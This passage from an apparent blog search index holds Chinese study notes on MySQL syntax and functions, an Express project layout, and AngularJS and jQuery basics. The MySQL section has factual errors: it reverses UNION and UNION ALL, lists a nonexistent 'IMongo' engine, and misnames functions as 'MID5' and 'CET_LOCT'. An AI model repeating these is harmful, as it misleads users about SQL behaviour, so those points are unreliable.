      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库]]></title>
    <url>%2F2017%2F03%2F06%2Ffirst%2F</url>
    <content type="text"><![CDATA[基本知识点 启动数据库服务net start mysql,关闭数据库服务net stop mysql 登录数据库mysql -u 用户名 -p 密码 显示数据库库名 show databases 建立数据库create database 数据库名 使用数据库use 数据库名 删除数据库 drop database 数据库名 进入数据库建立表; create table 表名(属性名 数据类型约束条件) 数据类型有int,tinyint,varchar,text,date,datetime,time等，现在而且已经支持json数据类型。 约束条件有NOT NULL非空，UNIQUE唯一性，PRIMARY KEY主键，AUTO_INCREMENT自增（一个表中最左只有一个字段约束条件为自增） 查看表的类型时可用DESC+表名，查看。或者show create table 表名\G,查看。第二种查看较详细。 表的存储引擎常见的三种MyISAM，IMongo。 如何修改数据表字段？ 修改字段数据类型alter table 数据库表名 modify 字段 数据类型约束条件。 修改字段名的位置alter table 数据库表名 modify 字段名 数据类型约束条件first(在第一个位置) | alter 字段名 (在此字段名之后) 修改字段名的名称 alter table 数据库表名 change 字段名 需要修改为的字段名 数据类型约束条件。 删除该字段 alter table 数据库表名 drop 字段名 添加字段 alter table 数据库表名 add 字段名 数据类型约束条件。 修改此表的存储引擎alter table 数据库表名 engine = 需修改为的数据存储引擎。 重新命名表名 alter table 数据表名 rename 需修改为的数据表名 索引 普通索引1、建表时：关键字 index(字段名)2、建表后： create index 索引属性名 on 表名(字段名)3、建表后：alter table 表名 add index 索引属性名 (字段名(索引长度)) 唯一性索引1、关键字UNIQUE，值必须有唯一性2、UNIQUE INDEX 索引属性名 (字段名类型(升序ASC降序DESC))3、create unique index 索引属性名 on 表名 (具有唯一性的字段名)4、alter table 表名 add unique index 索引名(属性名) 全文索引1、关键字fulltext，只能创建在char，varchar，text类型的字段上。2、fulltext index 索引属性名(字段名)3、create fulltext index 索引属性名 on 表名(字段名)4、alter table 表名 add fulltext index 索引名(索引名) 单列索引1、对应一个字段2、INDEX 索引属性名(字段名(索引长度))3、create index 索引属性名 on 表名 (字段名(索引长度))4、alter table 表名 add index 索引名 (字段名(索引长度)) 多列索引1、对应多个字段2、index 索引属性名(字段1，字段2，…)3、使用多列索引必须使用第一个字段查询4、create index索引属性名 on 表名 (字段1，字段2…)5、alter table 表名 add index 索引名(字段名1，字段名2，…) 空间索引1、关键字geometry,point,linestring,polygon等，只有MyISAM存储引擎支持空间检索。2、spatial index 索引属性名(字段名)3、create spatial index 索引属性名 on 表名(字段名)4、alter table 表名 add apatial index 索引名(字段名) 删除索引drop index 索引名 on 表名 视图 查询权限: select select_priv,Create_view_priv from mysql.user where user=’root’; 创建视图:单表创建视图：create view 视图名(视图的字段名) as select 表的字段(*号表示全部字段) from 表名 多表创建视图： create algorithm=merge view 视图名 (视图的字段名) as select 表的字段名 (两个字段名相同时可用表名.字段名表示) from 表名1，表名2… where条件。创建视图时数字加减字段名相当于字段里的数据加减数字。视图的约束条件在最后。算法在create之后。 查看视图1、desc 视图名2、SHOW TABLE STATUS LIKE’视图名’\G；也可查看数据表3.SHOW CREATE VIEW视图名\G;4.在视图的表中查看所有视图，SELECT*FROM information_schema.views\G; 修改视图1.CREATE OR REPLACE算法语句/表的类型VIEW视图名（视图字段名）AS SELECT表的字段名FROM表名约束条件；（此语句可创造或修改）2.ALTER算法语句/表的类型VIEW视图名（视图字段名）AS SELECT表的字段名FROM表名WHERE条件约束条件； 更新视图当更新视图时，表中的数据也随之改变。只能更改权限范围里的数据。有些视图无法更新：一.包含某些函数像SUM（）COUNT()MAX()MIN()等函数时。二.视图包含关键字时无法更新如UNION,UNIONALL,GROUP BY,HAVING等关键字。三.常量视图不能更改（就是只有一个值）。四.子查询不能更新视图五.由不可更新的视图导出的视图是不可更新的。五.临时表TEMPTABLE是不可更新的。1.UPTADE视图名SET视图字段名1=“更改后的数据”，…；2.视图中插入数据与表中插入数据相同INSERT INTO视图名VALUES（数据）； 删除视图删除视图：1.DROP VIEW IF EXISTS视图名1，…； 触发器触发器是由INSERT,UPDATE,DELETE来触发的某种特定操作。创建触发器：1.单个语句：CREATE TRIGGER触发器名BEFORE/AFTER特定操作ON表名FOR EACH ROW执行语句；多个语句：要用BEGIN，END关键字查看触发器：1.SHOW TRIGGERS；2.在表中查看SELECT*FROM information_schema.trigger\G;触发器的使用：触发器执行顺序BEFORE执行操作AFTER删除触发器：DROP TRIGGER触发器名； 操作数据1.插入数据：1.不指定字段名：INSERT INTO表名VALUES（数据1,…）；2.指定字段名:INSERT INTO表名（字段名1，…）values(数据1，…);3.同时插入多条记录：INSERT INTO表名（字段名1，…）values(数据1，…)，(数据1，…)，…;4.查询结果插入到表中：INSERT INTO表名（字段名1，…）SELECT字段名FROM表名； 更新数据UPDATE表名SET字段名1=‘数据’…WHERE条件； 删除数据DELETE FROM表名WHERE条件； 查询数据完全语法SELECT属性列表FROM表名和视图列表[WHERE条件表达式][GROUP BY属性名1[HAVING条件表达式2]][ORDER BY属性名2[ASC|DESC]]；1.SELECT字段名FROM表名；2.SELECT字段名FROM表名WHERE条件；3.SELECT字段名FROM表名WHERE条件ORDER BY字段名ASC/DESC；单表查询：1.查询所有字段2.查询部分字段（查询顺序与列出的属性顺序相同）3.查询指定记录WHERE4.带IN关键字的查询语法规则：WHERE[NOT]IN(元素1，元素2，…)查询条件表配合WHERE比较：&lt;,&gt;,=,&lt;=,&gt;=,!=,&lt;&gt;(不等于),!&gt;,!&lt;指定范围：BETWEEN AND,NOT BETWEEN AND指定集合：IN,NOT IN匹配字符：LIKE,NOT LIKE包括完全匹配和使用通配符%（表示多个字符）_（表示一个字符）。是否为空值：IS NULL,IS NOT NULL多个查询条件：AND,OR5.查询结果不重复SELECT DISTINCT字段名FROM表名；6.对查询结果排序ORDER BY属性名[ASC|DESC]，多个字段排序时，先排序第一个字段，如果第一个字段数据有相同再用第二个字段排序7.分组查询：1.SELECTFROM GROUP BY字段名;最先分到的优先。2.使用GROUP_CONCAT(聚合某个字段的数据)再按某个字段名分组：SELECT字段名,GROUP_CONCAT(字段名)FROM表名GROUP BY字段名。3.与集合函数使用COUNT()是统计要分组的数量：SELECT字段名,COUNT(字段名)FROM表名GROUP BY字段名。4.GROUP BY与HAVING一起使用：SELECT字段名,COUNT(字段名)FROM表名GROUP BY字段名HAVING COUNT(字段名)条件。5.按多个字段分组：SELECTFROM GROUP BY字段名1，字段名2，…（分组要全局考虑）6.记录求和：SELECT字段名,COUNT(字段名)FROM表名GROUP BY字段名WITH ROLLUPSELECT字段名,GROUP_CONCAT(字段名)FROM表名GROUP BY字段名WITH ROLLUP8.用LIMIT限制查询结果的数量1.不指定初始位置SELECTFROM表名LIMIT数量；2.指定初始位置SELECTFROM表名LIMIT开始，结束；9.使用集合函数查询：集合函数有COUNT(),SUM(),AVG(),MAX(),MIN()等。1.查询所有记录数：SELECT COUNT()FROM表名；2.分组计数：SELECT COUNT()FROM表名GROUP BY字段名；3.求总成绩：SELECT字段名，SUM(字段名)FROM表名WHERE条件；（根据分组来求总数）4.求平均值：SELECT AVG(字段名)FROM表名；（根据分组来求平均值）5.求最大值：SELECT MAX(字段)FROM表名；（根据分组来求最大值）6.求最小值：SELECT MIN(字段)FROM表名；（根据分组来求最小值）连接查询：1.内连接查询：SELECT多个字段名FROM多个表WHERE条件2.外连接查询：SELECT多个字段名FROM表一LEFT|RIGHT JOIN表二ON条件3.复合条件查询：SELECT多个字段名FROM多个表WHERE条件AND条件；子查询：子查询关键字包括IN、NOT IN、ANY、ALL、EXISTS、NOT EXISTS等关键字。子查询中包含比较运算符。举例：SELECT字段名FROM表名WHERE字段名IN(SELECT字段名FROM表名)SELECT字段名FROM表名WHERE字段名&gt;=(SELECT字段名FROM表名WHERE条件)SELECT字段名FROM表名WHERE EXISTS(查询语句只返回真假)SELECT字段名FROM表名WHERE字段名&gt;=ANY(查询语句的数据)SELECT字段名FROM表名WHERE字段名&gt;=ALL(查询语句的数据)合并查询结果：用UNION和UNION ALL关键字举例：SELECT字段名FROM表名UNION/UNION ALL SELECT字段名FROM表名；UNION不去除相同的值UNION ALL去除相同的值为表取别名：SELECT字段名FROM表名别名后面就可用此别名为字段取别名：SELECT字段名AS别名FROM表名正则表达式查询:正则表达式模式字符^:匹配字符串开始的部分\$:匹配字符串结束的部分.:代表字符串中的任意一个字符，包括回车和换行[字符集合]:匹配“字符集合”中的任意一个字符[^字符集合]：匹配“字符集合”外的任何一个字符S1|S2|S3:匹配S1,S2,S3的任意一个字符串*：包括多个该符号之前的字符，包括0和1个+：代表多个该符号之前的字符，包括1个字符串{N}：字符串出现N次{M,N}:字符串至少出现M次，至多出现N次。1.SELECT * FROM表名WHERE字段名REGEXP‘^开头的字符及字符串’;2.SELECT * FROM表名WHERE字段名REGEXP‘结尾的字符及字符串\$’;3.SELECT * FROM表名WHERE字段名REGEXP‘^开头的字符及字符串..结尾的字符串\$’;4.SELECT * FROM表名WHERE字段名REGEXP‘[多个字符]’;5.SELECT * FROM表名WHERE字段名REGEXP‘[0-9a-z]’;6.SELECT * FROM表名WHERE字段名REGEXP‘[^0-9a-z]’;7.SELECT * FROM表名WHERE字段名REGEXP‘字符串1|字符串2|字符串3’；8.SELECT * FROM表名WHERE字段名REGEXP‘a+c’(a至少出现一次)；9.SELECT * FROM表名WHERE字段名REGEXP‘a*c’(a可出现零次)；7.SELECT * FROM表名WHERE字段名REGEXP‘a{3}’(a出现三次)；7.SELECT * FROM表名WHERE字段名REGEXP‘a{3,6}’(a至少出现三次至多六次)； 运算符号符号+、-、*、/、%、DIV、MOD。 mysql函数1.数学函数：ABS()取绝对值,PI()取圆周率，SQRT()求平方根，MOD(X,Y)求余运算，CEIL(X)大于或等于x的最小整数,CEILING(X)大于或等于x的最小整数,FLOOR(X)小于或等于x的最大整数,RAND()随机的,RAND(X)x一定返回值相同，ROUND(X)返回离x最近的整数四舍五入，ROUND(X,Y)返回x保留小数点y位进行四舍五入，TRUNCATE(X,Y)返回x保留小数点y位不进行四舍五入，SIGN(X)返回x的符号用1 0-1表示，POW(X,Y)X的Y次方,POWER(X,Y)X的Y次方,EXP(X)e的X方，LOG(X)计算x的自然对数，LOG10(X)底数为10的对数，RADIANS(X)角度转换为弧度，DEGREES（X)弧度转换为角度，SIN（X)正弦值，ASIN（X)反正弦值x为-1到1，COS（X)余弦值，ACOS（X)反余弦值x为-1到1，COT(),TAN(),ATAN()。2.字符串函数：CHAR_LENGTH(s）字符串的字符数，LENGTH(s)字符串的长度，CONCAT(S1,S2,…)合并多个字符串，CONCAT_WS(X,S1,S2,…)可以将各字符串用参数X隔开，INSERT(S1,X,LEN,S2)函数将s1中x位置开始长度为len的字符串用s2替换，UPPER(S)和UCASE(S)将字符串s的所有字母变成大写字母，LOWER(S)和LCASE(S)函数将字符串s所有字母转换为小写字母，LEFT(s，n）返回字符串前n个字符，RIGHT(s，n）返回字符串后n个字符，LPAD(s1，len，s2）将s2填充到s1的开始处，使字符串达到len长度，RPAD（s1，len，s2）将s2填充到s1的结尾处，使字符串达到长度len，LTRIM（s）将去掉字符串s开始处的空格，RTRIM（s）将去掉字符串s结尾处的空格，TRIM（s）将去掉字符串s开始处和结尾处的空格，TRIM(s1 FROM s)将去掉字符串s中开始处和结尾处的字符串s1，REPEAT（s，n）将字符串s重复n次，SPACE(n）返回n个空格，REPLACE（s，s1，s2）将字符串s2替换到字符串s中的字符串s1，STRCMP(s1，s2）比较字符串s1，s2，返回-1 0 1，SUBSTRING(s，n，len）和MID（s，n，len）从字符串s的第n个位置获取长度为n的字符串，LOCATE(s1，s）、POSITION(s1 IN s）和INSTR(s，s1）从字符串s中获取s1的开始位置，REVERSE（s）将字符串s的顺序反过来，ELT（n，s1，s2，…）返回第n个字符串，FIELD(s，s1，s2，…）返回第一个与字符串s匹配的字符串的位置，FIND_IN_SET(s1，s2）返回在s2中与s1匹配的字符串的位置，MAKE_SET(x，s1，s2，…)按x的二进制数来取字符串。3.日期和时间函数：CURDATE()和CURRENT_DATE()获取当前日期，CURTIME()和CURRENT_TIME（）获取当前时间，NOW(),CURRENT_TIMESTAMP,LOCALTIME()和SYSDATE()获取当前日期和时间，UNIX_TIMESTAMP()以UNIX时间戳的形式返回当前时间，UNIX_TIMESTAMP(d)将时间d以UNIX时间戳的形式返回，FROM_UNIXTIME(d)把UNIX时间戳的形式转换为普通格式时间，UTC_DATE()返回UTC国际协调日期，UTC_TIME（）返回UTC国际协调时间，MONTH（d）返回日期d中的月份值，MONTHNAME(d）返回日期d中的月份的英文名字，DAYNAME（d）返回日期d是星期几英文名，DAYOFWEEK(d）返回日期d是星期几开头1为星期日以此类推，WEEKDAY（d）返回日期d是星期几开头0为星期一以此类推，WEEK(d）和WEEKOFYEAR（d）都是计算日期d是本年的第几个星期，DAYOFYEAR返回日期d是本年的第几天，DAYOFMONTH（d）返回日期d是本月的第几天，YEAR(d)返回日期d中的年份值，QUARTER（d）返回d是本年第几季度，HOUR（t）返回时间t中的小时值，MINUTE(t）返回时间t中的秒钟值，EXTRACT(type FROM d）从日期d中获取指定的值，由type类型决定，TIME_TO_SEC(t）将时间t转换为以秒为单位的时间，SEC_TO_TIME(s）将以秒为单位的时间s转换为转换为时分秒。计算日期和时间的函数：TO_DAYS(d）把日期转化为天数，FROM_DAYS(n）把天数转化为日期，DATEDIFF(d1，d2）指定某一天去比较d2-d1，ADDDATE(d，n）增加n天，SUBDATE(d，n）减去n天，ADDTIME(t，n)增加n秒，SUBTIME（t，n）减去n秒，ADDDATE(d，INTERVAL expr type)和DATE_ADD(d，INTERVAL expr type)d时间后的日期，将时间和日期格式化的函数：DATE_FORMAT（d，f）日期，TIME_FORMATE(t，f）时间，GET_FORMAT(type，s) 条件判断函数IF（expr，v1，v2）如果表达式expr成立，返回结果v1，否则返回v2。IFNULL(v1，v2）如果v1不为空就显示v1的值，否则就显示v2的值。CASE WHEN expr1 THEN v1[WHEN expr2 THEN v2…][ELSE vn]END。CASE expr1 WHEN e1 THEN v1[WHEN e2 THEN v2…][ELSE vn]END。 系统信息函数VERSION()获取mysql版本号，CONNECTION_ID()函数返回服务器的连接数，DATABASE()和SCHEMA()返回当前数据库名，USER()，SYSTEM_USER()，SESSION_USER(),CURRENT_USER()和CURRENT_USER获取用户名,CHARSET(str)返回字符串str的字符集，COLLATION（str）返回字符串str的字符排列顺序，LAST_INSERT_ID()返回最后生成的AUTO_INCREMENT值。 加密函数PASSWORD(str)对字符串str进行加密用于用户名密码。MID5(str)对字符串str进行加密用于一般数据。ENCODE(str，pswd_str)使用字符串pswd_str加密字符串str,加密的结果是一个二进制数，必须使用BLOB类型的字段来保存。 解密函数DECODE(crypt_str,pswd_str)可以使用字符串pswd_str来为crypt_str来解密crypt_str是通过ENCODE(str，pswd_str)加密的二进制数据。 其他函数格式化函数FORMAT（x，n)可以将数字x进行格式化，将x保留到小数点后n位需进行四舍五入。ASCLL（s）返回字符串s的第一个字符的ASCLL码，BIN(x)返回x的二进制编码，HEX(x)返回x的十六进制编码，OCT(x)返回x的八进制编码，CONV（x，f1，f2）将x从f1进制数变成f2进制数。INET_ATON(IP)可以将IP地址转换为数字表示需加引号，INET_NTOA（n）可以将数字n转换为IP地址。 解密加密函数CET_LOCT(name，time)定义一个名称为name、持续时间长度为time秒的锁，如果锁定成功返回1，如果尝试超时返回0.如果失败返回NULL。RELEASE_LOCK（name）解除名称为name的锁。如果解锁成功返回1，如果解锁失败返回0，如果尝试超时返回0IS_FREE_LOCK(name)判断是否使用name的锁，如果使用返回0，否则返回1.BENCHMARK(count,expr)将表达式expr重复执行count次，然后返回执行时间。改变字符集的函数CONVERT(s USING cs)将字符串s的字符集变成cs。 改变数据类型的函数CAST(x AS type)和CONVERT(x，type）将x变成type型，只改变输出值的类型，字段类型未变。 存储过程和函数1.创建存储过程：CREATE PROCEDURE存储过程名(IN数据名数据类型,OUT数据名数据类型,INOUT数据名数据类型)提取数据（如READS SQL DATA）BEGIN多个执行语句；END结束；2.创建存储函数：CREATE FUNCTION存储函数名（数据名数据类型）RETURNS返回值类型BEGIN多个执行语句：END结束；3.变量的使用：1.定义变量：DECLARE变量名数据类型默认值（DEFAULT)2.为变量赋值：SET变量名=数据值4.定义条件和处理程序：1.定义条件：DECLARE条件名CONDITION FOR SQLSDATE‘sqlsdate_value’。DECLARE条件名CONDITION FOR mysql_error_code。2.定义处理程序：DECLARE处理方式HANDLER FOR法一捕获sqlsdate_value：DECLARE CONTINUE HANDLER FOR SQLSTATE‘sqlsdate_value‘SET@info=‘CAN NOT FIND’；法二捕获mysql_error_code：DECLARE CONTINUE HANDLER FOR mysql_error_code SET@info=‘CAN NOT FIND’；法三调用定义条件：DECLARE CONTINUE HANDLER FOR条件名SET@info=‘CAN NOT FIND’；法四使用SQLWARNING：DECLARE EXIT HANDLER FOR SQLWARNING SET@info=‘ERROR’；法四使用SQLEXCEPTION：DECLARE EXIT HANDLER FOR SQLEXCEPTION SET@info=‘ERROR’；法五使用NOT FOUND:DECLARE EXIT HANDLER FOR NOT FOUND SET@info=‘CAN NOT FIND’；5.光标使用：1.声明光标：声明光标必须在处理程序之前，并且声明在变量和条件之后。DECLARE光标名CURSOR FOR SELECT多个字段名FROM表名；2.打开光标：OPEN光标名；3.使用光标：FETCH光标名INTO变量名；4.关闭光标：CLOSE光标名；6.流程控制的使用：1.IF语句判断语句THEN执行语句[ELSEIF判断语句THEN执行语句][ELSE执行语句]END IF;举例：IF age&gt;20 THEN SET@count1=@count1+1 ELSEIF age=20 THEN@count2=@count2+1 ELSE@count3=count3+1 END IF;2.CASE判断变量WHEN变量THEN执行语句WHEN变量THEN执行语句ELSE执行语句END CASE;3.开始标签：LOOP SET执行语句END LOOP结束标签；4.开始标签：LOOP SET执行语句IF判断语句THEN执行语句LEAVE标签名；END LOOP结束标签；5.ITERATE与LEAVE语句相同；6.REPEAT SET执行语句UNTIL条件END REPEAT；7.WHILE判断条件DO SET执行语句END WHILE；7.调用存储过程和函数：1.调用存储过程：CALL存储过程名举例：CALL存储名（1002，@n）；2.调用存储函数：与调用内部函数一样；8.查看存储过程和函数：1.SHOW PROCEDURE（查看存储函数）|FUNCTION（查看存储过程）STATUS LIKE‘名称’；2.SHOW CREATE PROCEDURE（查看存储函数）|FUNCTION（查看存储过程）名称；3.SELECT*FROM表名WHERE ROUTINE_NAME=‘名称’；9.修改存储过程和函数：ALTER PROCEDURE（查看存储函数）|FUNCTION（查看存储过程）名称]]></content>
      <categories>
        <category>关系型数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EffectWork开发之问题总结一]]></title>
    <url>%2F2017%2F03%2F02%2Ffirst%2F</url>
    <content type="text"><![CDATA[技术架构后台: 采用nodejs的express框架。设计模式: MVC设计模式，config-&gt;配置文件夹，controllers-&gt;控制层文件夹，middlewares-&gt;中间件文件夹，proxys-&gt;数据库代理文件夹，utils-&gt;工具文件夹，models-&gt;mongodb数据原型文件夹，app.js-&gt;项目入口文件，web_router.js-&gt;路由文件。]]></content>
      <categories>
        <category>混合式app项目</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs与html结合]]></title>
    <url>%2F2017%2F02%2F28%2Ffirst%2F</url>
    <content type="text"><![CDATA[环境搭建1、安装nodejs和npm2、利用git克隆项目，git clone https://github.com/angular/quickstart.git quickstart3、安装npm包,npm install4、运行npm start 来启动例子应用。1234git clone https://github.com/angular/quickstart.git quickstartcd quickstartnpm installnpm start 架构angular是一个用HTML和JavaScript或者一个可以编译成JavaScript的语言(例如Dart或者TypeScript)，来构建客户端应用的框架。该框架包括一系列库，有些是核心库，有些是可选库。我们这样写angular应用的:用angular扩展语法编写HTML模板，用组件类管理这些模板，用服务添加应用逻辑，用模板打包发布组件与服务。然后，我们通过引导根模板来启动应用。angular在浏览器中接管、展现应用的内容，并根据我们提供的操作指令响应用户的交互。当然，这只是冰山一角，后面我们将学习更多的细节。不过，我们看一下基本架构。!(加载图片中…)[20170228fisrt/angularview.png]这个架构图展现了angular应用中的8个主要构造块: 模块(module) 组件(component) 模板(template) 元数据(metadata) 数据绑定(data binding) 指令(directive) 服务(service) 依赖注入(dependency injection)]]></content>
      <categories>
        <category>angular</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs与html之模块]]></title>
    <url>%2F2017%2F02%2F28%2Fsecond%2F</url>
    <content type="text"><![CDATA[简介angular应用是模块化的，并且angular有自己的模块系统，它被称为_angular模块或_ngmodules。每个angular应用至少有一个根模块，习惯上命名为AppModule。根模块在一些小型应用中可能是唯一的模块，大多数应用会有很多特性模块，每个模块都是一个内聚的代码块专注于某个应用领域、工作流或紧密相关的功能。无论是根模块还是特性模块，都是一个带有‘@NgModule’装饰器的类。装饰器是用来修饰JavaScript类的函数。angular有很多装饰器，它们负责把元数据附加到类上，以了解那些类的设计意图以及它们如何工作。NgModule是一个装饰器函数，它接收一个用来描述模块属性元数据对象。其中最重要的属性是: declarations 声明本模块中拥有的视图类。angular有三种视图类:组件、指令和管道。 exports declarations的子集，可用于其他模块的组件模板。 imports 本模块声明的组件模板需要的类所在的其他模块。 providers 服务的创建者，并加入到全局服务列表中，可用于应用任何部分。 bootstrap 指定应用的主视图，它是所有其它视图的宿主，只要根模块才能设置bootstrap属性。实例下面是一个简单的根模块:12345678910import &#123;NgModule&#125; from '@angular/core';import &#123;BrowserModule&#125; from '@angular/platform-browser';@NgModule(&#123; imports : [BrowserModule], providers : [Logger], declarations : [AppComponent], exports : [AppComponent],` bootstrap : [AppComponent]&#125;)export class AppModule &#123; &#125; AppComponent的export语句只是用于演示如何导出的，它在这个例子中并不是必须的。 根模块不需要导出任何东西，因为其它组件不需要导入根模块。然后我们通过引导根模块来启动应用。在开发期间，你通常在一个main.ts文件中引导AppModule，就像这样:123import &#123; platformBrowserDynamic &#125; from '@angular/platform-browser-dynamic';import &#123; AppModule &#125; from './app/app.module';platfromBrowserDynamic().bootstrapModule 模块库angular提供了一组JavaScript模块。可以把它们看做库模块。每个angular库的名字都带有@angular前缀。用npm包管理工具安装它们，用JavaScript的import语句导入其中某些部件。例如，像下面这样，从@angular/core库中导入component装饰器:1import &#123; Component &#125; from '@angular/core'; 还可以使用JavaScript的导入语句从angular库中导入angular模块。1import &#123; BrowserModule &#125; from '@angular/platform-browser'; 在上面那个简单的根模块的例子中，应用模块需要BrowserModule的某些素材。要访问这些素材，就得把它加入@NgModule元数据的imports中，像这样:1imports : [BrowserModule], 这种情况下，你同时使用了angular和JavaScript的模块化系统。]]></content>
      <categories>
        <category>angular</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs之表达式]]></title>
    <url>%2F2017%2F02%2F26%2Fforth%2F</url>
    <content type="text"><![CDATA[简介angularjs通过新的属性和表达式扩展了HTML。angularjs可以构建一个单一页面应用程序。 angularjs数字12345&lt;div ng-app="" ng-init="quantity=1;cost=5"&gt; &lt;p&gt;总价： &#123;&#123; quantity * cost &#125;&#125;&lt;/p&gt; &lt;/div&gt; 使用ng-init的相同实例:12345&lt;div ng-app="" ng-init="quantity=1;cost=5"&gt; &lt;p&gt;总价： &lt;span ng-bind="quantity * cost"&gt;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; angularjs字符串12345&lt;div ng-app="" ng-init="firstName='John';lastName='Doe'"&gt; &lt;p&gt;姓名： &#123;&#123; firstName + " " + lastName &#125;&#125;&lt;/p&gt; &lt;/div&gt; 使用ng-init的相同实例:12345&lt;div ng-app="" ng-init="firstName='John';lastName='Doe'"&gt; &lt;p&gt;姓名： &lt;span ng-bind="firstName + ' ' + lastName"&gt;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; angularjs对象12345&lt;div ng-app="" ng-init="person=&#123;firstName:'John',lastName:'Doe'&#125;"&gt; &lt;p&gt;姓为 &#123;&#123; person.lastName &#125;&#125;&lt;/p&gt; &lt;/div&gt; 使用ng-bind的相同实例:12345&lt;div ng-app="" ng-init="person=&#123;firstName:'John',lastName:'Doe'&#125;"&gt; &lt;p&gt;姓为 &lt;span ng-bind="person.lastName"&gt;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; angularjs数组12345&lt;div ng-app="" ng-init="points=[1,15,19,2,40]"&gt; &lt;p&gt;第三个值为 &#123;&#123; points[2] &#125;&#125;&lt;/p&gt; &lt;/div&gt; 使用ng-bind的相同实例:12345&lt;div ng-app="" ng-init="points=[1,15,19,2,40]"&gt; &lt;p&gt;第三个值为 &lt;span ng-bind="points[2]"&gt;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>angularjs</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery之常用事件]]></title>
    <url>%2F2017%2F02%2F26%2Fsecond%2F</url>
    <content type="text"><![CDATA[jQuery事件 方法 描述 blur() 添加/触发失去焦点事件 change() 添加/触发 change 事件 click() 添加/触发 click 事件 dbclick() 添加/触发 double click 事件 focus() 添加/触发 focus 事件 focusin() 添加事件处理程序到 focusin 事件 focusout() 添加事件处理程序到 focusout 事件 hover() 添加两个事件处理程序到 hover 事件 keydown() 添加/触发 keydown 事件 keypress() 添加/触发 keypress 事件 keyup() 添加/触发 keyup 事件 mousedown() 添加/触发 mousedown 事件 mouseenter() 添加/触发 mouseenter 事件 mouseleave() 添加/触发 mouseleave 事件 mousemove() 添加/触发 mousemove 事件 mouseout() 添加/触发 mouseout 事件 mouseover() 添加/触发 mouseover 事件 mouseup() 添加/触发 mouseup 事件 off() 移除通过 on() 方法添加的事件处理程序 on() 向元素添加事件处理程序 one() 向被选元素添加一个或多个事件处理程序。该处理程序只能被每个元素触发一次 ready() 规定当 DOM 完全加载时要执行的函数 resize() 添加/触发 resize 事件 scroll() 添加/触发 scroll 事件 select() 添加/触发 select 事件 submit() 添加/触发 submit 事件 event.pageX 返回相对于文档左边缘的鼠标位置 event.pageY 返回相对于文档上边缘的鼠标位置]]></content>
      <categories>
        <category>JavaScript</category>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[angularjs之指令]]></title>
    <url>%2F2017%2F02%2F26%2Ffifth%2F</url>
    <content type="text"><![CDATA[简介AngularJS 通过被称为 指令 的新属性来扩展 HTML。AngularJS 通过内置的指令来为应用添加功能。AngularJS 允许你自定义指令。AngularJS 指令是扩展的 HTML 属性，带有前缀 ng-。ng-app 指令初始化一个 AngularJS 应用程序。ng-init 指令初始化应用程序数据。ng-model 指令把元素值（比如输入域的值）绑定到应用程序。1234567&lt;div ng-app="" ng-init="firstName='John'"&gt; &lt;p&gt;在输入框中尝试输入：&lt;/p&gt; &lt;p&gt;姓名：&lt;input type="text" ng-model="firstName"&gt;&lt;/p&gt; &lt;p&gt;你输入的为： &#123;&#123; firstName &#125;&#125;&lt;/p&gt; &lt;/div&gt; ng-app 指令告诉 AngularJS， 元素是 AngularJS 应用程序 的”所有者”。 数据绑定ng-model双向绑定。12345678910&lt;div ng-app="" ng-init="quantity=1;price=5"&gt; &lt;h2&gt;价格计算器&lt;/h2&gt; 数量： &lt;input type="number" ng-model="quantity"&gt;价格： &lt;input type="number" ng-model="price"&gt; &lt;p&gt;&lt;b&gt;总价：&lt;/b&gt; &#123;&#123; quantity * price &#125;&#125;&lt;/p&gt; &lt;/div&gt; 重复HTML元素12345678&lt;div ng-app="" ng-init="names=['Jani','Hege','Kai']"&gt; &lt;p&gt;使用 ng-repeat 来循环数组&lt;/p&gt; &lt;ul&gt; &lt;li ng-repeat="x in names"&gt; &#123;&#123; x &#125;&#125; &lt;/li&gt; &lt;/ul&gt;&lt;/div&gt; ng-repeat指令用在一个对象数组上:12345678910111213&lt;div ng-app="" ng-init="names=[&#123;name:'Jani',country:'Norway'&#125;,&#123;name:'Hege',country:'Sweden'&#125;,&#123;name:'Kai',country:'Denmark'&#125;]"&gt; &lt;p&gt;循环对象：&lt;/p&gt;&lt;ul&gt; &lt;li ng-repeat="x in names"&gt; &#123;&#123; x.name + ', ' + x.country &#125;&#125; &lt;/li&gt;&lt;/ul&gt; &lt;/div&gt; ng-app指令ng-app 指令定义了 AngularJS 应用程序的 根元素。ng-app 指令在网页加载完毕时会自动引导（自动初始化）应用程序。 ng-init指令ng-init 指令为 AngularJS 应用程序定义了 初始值。 ng-model指令ng-model 指令 绑定 HTML 元素 到应用程序数据。ng-model指令也可以: 为应用程序数据提供类型验证（number、email、required）。 为应用程序数据提供状态（invalid、dirty、touched、error）。 为 HTML 元素提供 CSS 类。 绑定 HTML 元素到 HTML 表单。ng-reapeat指令ng-repeat 指令对于集合中（数组中）的每个项会 克隆一次 HTML 元素。创建自定义的指令除了 AngularJS 内置的指令外，我们还可以创建自定义指令。你可以使用 .directive 函数来添加自定义的指令。要调用自定义指令，HTML 元素上需要添加自定义指令名。使用驼峰法来命名一个指令， runoobDirective, 但在使用它时需要以 - 分割, runoob-directive:1234567891011121314&lt;body ng-app="myApp"&gt;&lt;runoob-directive&gt;&lt;/runoob-directive&gt;&lt;script&gt;var app = angular.module("myApp", []);app.directive("runoobDirective", function() &#123; return &#123; template : "&lt;h1&gt;自定义指令!&lt;/h1&gt;" &#125;;&#125;);&lt;/script&gt;&lt;/body&gt; 您可以通过以下方式来调用指令: 元素名 属性 类名 注释12345678元素名&lt;runoob-directive&gt;&lt;/runoob-directive&gt;属性&lt;div runoob-directive&gt;&lt;/div&gt;类名&lt;div 